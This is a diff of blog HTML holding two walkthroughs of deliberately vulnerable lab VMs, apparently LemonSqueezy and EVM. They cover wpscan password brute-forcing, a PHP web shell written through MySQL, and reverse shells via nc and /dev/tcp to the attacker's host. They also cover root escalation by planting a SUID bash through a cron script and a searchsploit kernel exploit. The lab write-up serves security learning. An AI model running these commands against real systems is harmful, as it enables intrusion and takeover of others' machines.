@@ -23,29 +23,30 @@ as our initial foothold and we then escalate privileges by abusing a cron job ru
 script.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Apache2 Debian Default Page: It works
-MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.191.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00014s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.25 &lt;span style="color:#f92672">((&lt;/span>Debian&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.25 &lt;span style="color:#f92672">(&lt;/span>Debian&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Debian Default Page: It works
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="80-http">80 (HTTP)&lt;/h2>
 &lt;p>Visiting this page on the browser only serves the apache default page, confirming what nmap found in title.&lt;/p>
 &lt;p>After performing a directory bruteforce using ffuf we get the following directories:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ffuf -ic -c -u &lt;span style="color:#e6db74">&amp;#39;http://192.168.191.134/FUZZ&amp;#39;&lt;/span> -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t &lt;span style="color:#ae81ff">50&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-1.png" class="center" style="border-radius: 8px;" />
 &lt;p>Checking the /wordpress directory, we see a basic wordpress site with not much information.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-2.png" class="center" style="border-radius: 8px;" />
 &lt;p>Performing enumeration using wpscan, the only interesting information gathered is the usernames.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -e ap,at,tt,cb,dbe,u -o wpscan.out --api-token
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-3.png" class="center" style="border-radius: 8px;" />
 &lt;p>Bruteforcing the credentials for each user, we discover the password of the orange user.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://lemonsqueezy/wordpress -U orange -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-4.png" class="center" style="border-radius: 8px;" />
 &lt;p>After logging into wordpress with the discovered credentials &lt;strong>orange:ginger&lt;/strong>, we find another password in drafts.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-5.png" class="center" style="border-radius: 8px;" />
@@ -54,15 +55,15 @@ MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&
 &lt;p>Successful login:&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-7.png" class="center" style="border-radius: 8px;" />
 &lt;p>By logging in we can abuse this access by writing a file to disk that contains php by using an sql statement.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sql" data-lang="sql">&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sql" data-lang="sql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">SELECT&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;?php system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">into&lt;/span> outfile &lt;span style="color:#e6db74">&amp;#34;/var/www/html/wordpress/shell.php&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-8.png" class="center" style="border-radius: 8px;" />
 &lt;p>We can then verify that we have successful command execution, by running the whoami command.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-9.png" class="center" style="border-radius: 8px;" />
 &lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
 &lt;p>Running the below curl command we are able to get a reverse shell:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl &lt;span style="color:#e6db74">&amp;#34;http://192.168.191.134/wordpress/shell.php?cmd=nc+-e+/bin/bash+192.168.191.1+9000+%26&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-10.png" class="center" style="border-radius: 8px;" />
 &lt;p>After performing some manual local enumeration, we discover a cron job running as root.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-11.png" class="center" style="border-radius: 8px;" />
@@ -70,14 +71,14 @@ MAC Address: 00:0C:29:FF:26:DE &lt;span style="color:#f92672">(&lt;/span>VMware&
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-12.png" class="center" style="border-radius: 8px;" />
 &lt;h1 id="shell-as-root">Shell as root&lt;/h1>
 &lt;p>After changing the script to the below command we can create a bash binary with suid permissions.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
-&lt;/span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
-chmod u+s /suidbash
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>cp /bin/bash /suidbash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod u+s /suidbash
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-13.png" class="center" style="border-radius: 8px;" />
 &lt;p>Once the cron is executed we get the binary and can escalate to root shell and read root.txt.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">./suidbash -p
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>./suidbash -p
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/lemonsqueezy1/lemon-14.png" class="center" style="border-radius: 8px;" />
 &lt;h1 id="extras">Extras&lt;/h1>
 &lt;ul>
@@ -111,58 +112,61 @@ was straightforward as we found the root password in a txt file. Some kernel exp
 been used for privilege escalation.&lt;/p>
 &lt;h1 id="reconnaissance">Reconnaissance&lt;/h1>
 &lt;p>Nmap&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.103
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.00028s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-53/tcp open domain ISC BIND 9.10.3-P4 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux&lt;span style="color:#f92672">)&lt;/span>
-| dns-nsid:
-|_ bind.version: 9.10.3-P4-Ubuntu
-80/tcp open http Apache httpd 2.4.18 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
-|_http-server-header: Apache/2.4.18 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
-|_http-title: Apache2 Ubuntu Default Page: It works
-110/tcp open pop3 Dovecot pop3d
-|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
-139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
-143/tcp open imap Dovecot imapd
-|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
-445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
-Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
-Host script results:
-|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
-|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style="color:#f92672">(&lt;/span>unknown&lt;span style="color:#f92672">)&lt;/span>
-| smb-os-discovery:
-| OS: Windows 6.1 &lt;span style="color:#f92672">(&lt;/span>Samba 4.3.11-Ubuntu&lt;span style="color:#f92672">)&lt;/span>
-| Computer name: ubuntu-extermely-vulnerable-m4ch1ine
-| NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
-| Domain name: &lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
-| FQDN: ubuntu-extermely-vulnerable-m4ch1ine
-|_ System time: 2021-03-04T15:43:32-05:00
-| smb-security-mode:
-| account_used: guest
-| authentication_level: user
-| challenge_response: supported
-|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
-| smb2-security-mode:
-| 2.02:
-|_ Message signing enabled but not required
-| smb2-time:
-| date: 2021-03-04T20:43:32
-|_ start_date: N/A
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 192.168.56.103
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.00028s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux; protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>53/tcp open domain ISC BIND 9.10.3-P4 &lt;span style="color:#f92672">(&lt;/span>Ubuntu Linux&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| dns-nsid:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ bind.version: 9.10.3-P4-Ubuntu
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>80/tcp open http Apache httpd 2.4.18 &lt;span style="color:#f92672">((&lt;/span>Ubuntu&lt;span style="color:#f92672">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Apache/2.4.18 &lt;span style="color:#f92672">(&lt;/span>Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Apache2 Ubuntu Default Page: It works
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>110/tcp open pop3 Dovecot pop3d
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Samba smbd 3.X - 4.X &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>143/tcp open imap Dovecot imapd
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style="color:#f92672">(&lt;/span>workgroup: WORKGROUP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style="color:#f92672">(&lt;/span>unknown&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows 6.1 &lt;span style="color:#f92672">(&lt;/span>Samba 4.3.11-Ubuntu&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: ubuntu-extermely-vulnerable-m4ch1ine
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Domain name: &lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| FQDN: ubuntu-extermely-vulnerable-m4ch1ine
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ System time: 2021-03-04T15:43:32-05:00
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: guest
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 2.02:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled but not required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2021-03-04T20:43:32
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: N/A
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;h2 id="samba-139445">Samba (139,445)&lt;/h2>
 &lt;p>Running smbmap and smbclient there&amp;rsquo;s not much there.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -R -H 192.168.56.103
-smbclient -L &lt;span style="color:#ae81ff">\\&lt;/span>192.168.56.103 -N
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbmap -R -H 192.168.56.103
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>smbclient -L &lt;span style="color:#ae81ff">\\&lt;/span>192.168.56.103 -N
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm1.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>From enum4linux-ng we only get a username&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">enum4linux-ng -A -R 192.168.56.103
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>enum4linux-ng -A -R 192.168.56.103
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm2.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h2 id="http-80">HTTP (80)&lt;/h2>
 &lt;p>Visiting the ip on the browser there&amp;rsquo;s only the apache default page.&lt;/p>
@@ -173,16 +177,16 @@ smbclient -L &lt;span style="color:#ae81ff">\\&lt;/span>192.168.56.103 -N
 &lt;p>Some of the comments hint towards bruteforcing credentials.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm5.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Bruteforcing the login page on wordpress we get the password &lt;code>24992499&lt;/code>&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style="color:#ae81ff">100&lt;/span>
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style="color:#ae81ff">100&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm7.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;h1 id="shell-as-www-data">Shell as www-data&lt;/h1>
 &lt;p>With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span>)&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
-&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#a6e22e">exec&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span>)&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm6.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Loading the following url we get a reverse shell.&lt;/p>
-&lt;pre>&lt;code>http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
+&lt;pre tabindex="0">&lt;code>http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
 &lt;/code>&lt;/pre>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm8.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Changing directory to /home there&amp;rsquo;s one user&amp;rsquo;s folder. Looking at all the files in this directory there&amp;rsquo;s a hidden
@@ -198,9 +202,10 @@ file with the root user&amp;rsquo;s password.&lt;/p>
 we get several hits.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/evm/evm12.png" alt="symfonos" class="center" style="border-radius: 8px;" />
 &lt;p>Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">searchsploit -m &lt;span style="color:#ae81ff">45010&lt;/span>
